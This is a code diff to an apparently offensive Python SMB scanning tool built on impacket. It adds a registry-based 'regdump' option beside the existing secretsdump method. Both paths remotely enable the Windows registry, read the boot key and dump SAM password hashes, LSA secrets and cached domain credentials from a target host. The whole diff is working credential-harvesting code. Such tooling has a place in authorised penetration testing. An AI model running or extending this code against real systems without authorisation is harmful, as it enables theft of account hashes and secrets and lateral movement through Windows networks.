@@ -24,6 +24,7 @@ from impacket.smb3structs import SMB2_DIALECT_21
 from impacket.dcerpc.v5 import transport, scmr
 from impacket.dcerpc.v5.rpcrt import DCERPCException
 from impacket.examples.secretsdump import RemoteOperations, SAMHashes, LSASecrets, NTDSHashes
+from impacket.examples.regsecrets import RemoteOperations as RegSecretsRemoteOperations, SAMHashes as RegSecretsSAMHashes, LSASecrets as RegSecretsLSASecrets
 
 #import random
 #from six import b
@@ -817,7 +818,7 @@ class SMBScan:
             return None
         return output, method
 
-    def enable_remoteops(self):
+    def enable_remoteops(self, regsecret=False):
         if self.remote_ops is not None and self.bootkey is not None:
             return
 
@@ -825,14 +826,17 @@ class SMBScan:
         dc_ip = self.creds['dc_ip'] if 'dc_ip' in self.creds else None
 
         try:
-            self.remote_ops  = RemoteOperations(self.conn, do_kerberos, dc_ip) #self.__doKerberos, self.__kdcHost
+            if regsecret:
+                self.remote_ops  = RegSecretsRemoteOperations(self.conn, do_kerberos, dc_ip) #self.__doKerberos, self.__kdcHost
+            else:
+                self.remote_ops  = RemoteOperations(self.conn, do_kerberos, dc_ip) #self.__doKerberos, self.__kdcHost
             self.remote_ops.enableRegistry()
             self.bootkey = self.remote_ops.getBootKey()
         except Exception as e:
             raise e
 
-    def dump_sam(self):
-        self.enable_remoteops()
+    def dump_sam(self, method):
+        self.enable_remoteops(regsecret=(method=='regdump'))
 
         sam_entries = []
         def new_sam_hash(sam_hash):
@@ -840,8 +844,11 @@ class SMBScan:
             sam_entries.append({'username': username, 'hash': ':'.join((lmhash, nthash))})
 
         if self.remote_ops and self.bootkey:
-            SAMFileName = self.remote_ops.saveSAM()
-            SAM = SAMHashes(SAMFileName, self.bootkey, isRemote=True, perSecretCallback=lambda secret: new_sam_hash(secret))
+            if method == 'regdump':
+                SAM = RegSecretsSAMHashes(self.bootkey, remoteOps=self.remote_ops, perSecretCallback=lambda secret: new_sam_hash(secret))
+            else:
+                SAMFileName = self.remote_ops.saveSAM()
+                SAM = SAMHashes(SAMFileName, self.bootkey, isRemote=True, perSecretCallback=lambda secret: new_sam_hash(secret))
 
             SAM.dump()
 
@@ -853,12 +860,13 @@ class SMBScan:
             self.remote_ops = None
             self.bootkey = None
 
-            SAM.finish()
+            if method == "secdump":
+                SAM.finish()
 
         return sam_entries
 
-    def dump_lsa(self):
-        self.enable_remoteops()
+    def dump_lsa(self, method):
+        self.enable_remoteops(regsecret=(method=='regdump'))
 
         lsa_entries = []
         def new_lsa_secret(secret):
@@ -866,10 +874,13 @@ class SMBScan:
 
         if self.remote_ops and self.bootkey:
 
-            SECURITYFileName = self.remote_ops.saveSECURITY()
+            if method == 'regdump':
+                LSA = RegSecretsLSASecrets(bootKey=self.bootkey, remoteOps=self.remote_ops, perSecretCallback=lambda secretType, secret: new_lsa_secret(secret))
+            else:
+                SECURITYFileName = self.remote_ops.saveSECURITY()
 
-            LSA = LSASecrets(SECURITYFileName, self.bootkey, self.remote_ops, isRemote=True,
-                             perSecretCallback=lambda secretType, secret: new_lsa_secret(secret))
+                LSA = LSASecrets(SECURITYFileName, self.bootkey, self.remote_ops, isRemote=True,
+                                 perSecretCallback=lambda secretType, secret: new_lsa_secret(secret))
 
             LSA.dumpCachedHashes()
             LSA.dumpSecrets()
@@ -882,7 +893,8 @@ class SMBScan:
             self.remote_ops = None
             self.bootkey = None
 
-            LSA.finish()
+            if method == "secdump":
+                LSA.finish()
 
         return lsa_entries
 
